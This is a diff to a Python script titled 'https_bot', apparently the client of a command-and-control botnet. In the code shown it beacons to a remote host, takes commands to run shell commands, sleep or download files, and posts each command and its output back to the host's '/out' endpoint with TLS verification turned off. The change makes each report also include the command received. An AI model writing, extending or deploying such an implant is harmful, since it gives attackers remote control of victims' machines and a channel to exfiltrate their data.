@@ -1,4 +1,4 @@
-#https_bot v0.7
+#https_bot v0.8
 import requests
 import logging
 import subprocess
@@ -19,12 +19,12 @@ def beacon(host, seconds, proxies):
     fetch, content = request(host, proxies)
     if str(fetch) == "<Response [200]>":
       output = parse(content, proxies)
-      send(host, output, proxies)
+      send(host, content, output, proxies)
   except:
     return 0
 
-def send(host, output, proxies):
-  output = botID[0]+', '+output
+def send(host, content, output, proxies):
+  output = botID[0]+', '+content+', '+output
   if proxies is not None:
     response = requests.post('https://'+host+'/out', data=output, verify=False, proxies=proxies)
     return response     
@@ -51,9 +51,9 @@ def parse(response, proxies):
     return execute(ex)
   if commands[0] == "sleep":
     time.sleep(int(commands[1]))
-    return "slept for "+str(commands[1])+"\n"
+    return "slept for "+str(commands[1])+'\n'
   if commands[0] == "download":
-    return "saved to "+str(download(commands[1], proxies))+"\n"
+    return "saved to "+str(download(commands[1], proxies))+'\n'
   else: return 0
 
 def execute(command):
